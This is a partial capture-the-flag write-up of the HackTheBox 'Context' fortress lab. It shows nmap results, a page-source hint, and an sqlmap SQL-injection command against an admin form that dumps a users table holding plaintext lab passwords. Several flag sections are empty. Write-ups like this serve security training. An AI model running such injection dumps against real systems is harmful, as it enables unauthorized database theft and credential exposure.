# HackTheBox Fortress Context Writeup
## Nmap
```
Nmap scan report for 10.13.37.12
Host is up, received user-set (0.20s latency).
Scanned at 2024-02-08 09:21:49 +08 for 522s
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
443/tcp  open  https         syn-ack ttl 127 Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=WMSvc-SHA2-WEB
| Issuer: commonName=WMSvc-SHA2-WEB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-10-12T18:31:49
| Not valid after:  2030-10-10T18:31:49
| MD5:   c589:6bbb:2543:2625:af6d:b035:3d43:022f
| SHA-1: 1c2d:2993:7485:b9d7:c1c4:ad24:413d:298e:0860:6c6e
| -----BEGIN CERTIFICATE-----
| MIIC4zCCAcugAwIBAgIQbB3YxCogyIFPZivcnEqnwzANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5XTVN2Yy1TSEEyLVdFQjAeFw0yMDEwMTIxODMxNDlaFw0zMDEw
| MTAxODMxNDlaMBkxFzAVBgNVBAMTDldNU3ZjLVNIQTItV0VCMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAx7/HBeJVXUn+RPPwUBVMvCAJYKQPiX/nRxZX
| Xhpfpv8Y+AP6Gd4Ou/tAjUomLaxnj06OBuu9K2I2Mh4zFMucMEsrWKsaQ++y5iKM
| CUkSoVI7XbPKt+7N2zWuQOxWmLsEHII+yCT/blhz3C/j+jj7iv7Y4nRg1XHn+D21
| nOJ4Aq1ZS6o4hN1zwYv3d0+CeYpR2TjPwT3FKAIBNmuBKQ2ZFCgW6723FjhGcxTL
| N9ob19zbPsE9d6CF9Lnm3dQrNnTVI1YledDF917jxx/NdjnAScyBWeqkTsnBU163
| p6QJDwFW8g5wOuXQLdnn1i6V4GxmJvXyUpc/NGPKJJ9GSwv/vQIDAQABoycwJTAT
| BgNVHSUEDDAKBggrBgEFBQcDATAOBgNVHQ8EBwMFALAAAAAwDQYJKoZIhvcNAQEL
| BQADggEBACnBPEjeAS/Dj6M31gRydL5o2cRwWAwV5SvGSgya42fyebvlvA5H9jPv
| rIe6x+K62DFG7j4AqiHDw27FRPcm5fklXWvMkoJ+ffFqytEJkennf1iJL16J7vlg
| ZBaOarzBIsq5cuAngefdQONrDuJpMblA5wRW05NcYm3LsFBPhVfYFMHljThHV2Fj
| a6jYHW63PcINcNx8djwIWvA6LWY6J2Ul3oGprtnNdbuWc6MnQgTHwLlv2M5tiBHS
| FLnBDdBh5oHxMDv2P0P7VUoLn+oCWpVjjOBYd6VGYkflSHTkEARhfHkeP6UOKHj3
| CI5x2n+P7ZymbKMF3fcOYeSy/K3Z1qs=
|_-----END CERTIFICATE-----
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Home page - Home
| http-methods: 
|_  Supported Methods: GET
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2070.00; GDR1
| ms-sql-info: 
|   10.13.37.12:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 GDR1
|       number: 15.00.2070.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: GDR1
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.13.37.12:1433: 
|     Target_Name: TEIGNTON
|     NetBIOS_Domain_Name: TEIGNTON
|     NetBIOS_Computer_Name: WEB
|     DNS_Domain_Name: TEIGNTON.HTB
|     DNS_Computer_Name: WEB.TEIGNTON.HTB
|     DNS_Tree_Name: TEIGNTON.HTB
|_    Product_Version: 10.0.17763
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: TEIGNTON
|   NetBIOS_Domain_Name: TEIGNTON
|   NetBIOS_Computer_Name: WEB
|   DNS_Domain_Name: TEIGNTON.HTB
|   DNS_Computer_Name: WEB.TEIGNTON.HTB
|   DNS_Tree_Name: TEIGNTON.HTB
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-08T02:29:45+00:00
| ssl-cert: Subject: commonName=WEB.TEIGNTON.HTB
| Issuer: commonName=WEB.TEIGNTON.HTB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-03T21:38:49
| Not valid after:  2024-08-04T21:38:49
| MD5:   0b1f:cebb:ded3:39f8:0932:eb31:6634:5113
| SHA-1: 0b6e:0167:11f3:bdc2:76a8:285e:4a69:549d:229c:33dd
| -----BEGIN CERTIFICATE-----
| MIIC5DCCAcygAwIBAgIQPnOUCYUj+blN0DF1X31JAjANBgkqhkiG9w0BAQsFADAb
| MRkwFwYDVQQDExBXRUIuVEVJR05UT04uSFRCMB4XDTI0MDIwMzIxMzg0OVoXDTI0
| MDgwNDIxMzg0OVowGzEZMBcGA1UEAxMQV0VCLlRFSUdOVE9OLkhUQjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAK1y8ynqmKcgaFuPsxNvTgbCD3SHhz6I
| LeqAc2PzdbdxMzTLeLE6l0RAaHntzaGi8BM94F4zu5CIWALZtHs+jk1gyi0RHDdX
| 8il/9BN5f/hmDJJzleZETFJgbK9187/IctLmW8eZJrqlGyGQENwu4+9orHNQQRtr
| VHOdusRH5NBWXc9fnVh7pahzhUw98+Kt9TE2I3EyKq0WoeCIme+p0x7NpRE0EVky
| o4H1ONKNu5KbtmcZALg8bcsQ/ZOVipWcgDMu4gQi3w86xYjYOLN+BGzla4LA1Uog
| ISA55Q13yY2/Rc9Sq1/7q2GIYmf/ENtOPGFYuRIEkYLWeaN7AgN2UwECAwEAAaMk
| MCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEB
| CwUAA4IBAQCEbh6DceHoz22rc8mq4bH3m/VXg8xFoaHgDUjIY40JlFaZTslP84xi
| 9dFa+Pa1qYG6YtgzQNUwQwj9pu6ZOzibe+uYKFmy6rSZF92+PAyPPD2Fu2WlLACZ
| mJnLccLYa1bb6ELItliTkBexTQZKAqhb99oV4Hy/wju5DBWG1qg8YPkRFNEOIQQ1
| 2cyULYvaxHz/Gh+IwmCQoBVeC8TonHTUNai89VuxgXHhuX4WxyyOb3yiHGyMjEtk
| /0b5j13gD/WT49DDd4ZJMUU+LnQgPLWxEE1yw5tz9r0gcakdW1CYmpQVXkuPPBON
| xAAtFatzGa26EHjyFHUjyrxZBnmkVf9F
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

## Flag 1 But we have SSL!?


## Flag 2 That shouldn't be there...
view-source:https://10.13.37.12/Home/Staff

## Flag 3 Have we met before?
```bash
sqlmap -u 'https://10.13.37.12:443/Admin/AddProduct' --data='name=1&price=1&creationYear=1&certified=1&__RequestVerificationToken=CfDJ8K9TQWNukZhLhmhij967A4N1qNy8yK6D_PYoKKWFzGhwu2T0AKBh7eORVPVQsIounQOjuK_T7V9FOQhn6N3I78_dsxykDdrBAbwYYoZ2VL5r3tVgXbqhYltG8CfWsYQd9E4Vpkunp1td9QFz4YeOWbg' --level=5 --risk=3 --dbms='Microsoft SQL Server ' --cookie='[...SNIP...]' --dump-all

...[SNIP]...
available databases [4]:
[*] model
[*] msdb
[*] tempdb
[*] webapp

Database: webapp
[2 tables]
+----------+
| products |
| users    |
+----------+

Database: webapp
Table: users
[3 entries]
+----+----------------------------------------+----------------+-----------+------------+
| id | password                               | username       | last_name | first_name |
+----+----------------------------------------+----------------+-----------+------------+
| 1  | admin                                  | jay.teignton   | Teignton  | Jay        |
| 2  | AMkru$3_f'/Q^7f?                       | abbie.buckfast | Buckfast  | Abbie      |
| 3  | CONTEXT{d[REDACTED]t}                  | test           | tester    | testing    |
+----+----------------------------------------+----------------+-----------+------------+
```

## Flag 4 Is it a bird? Is it a plane?


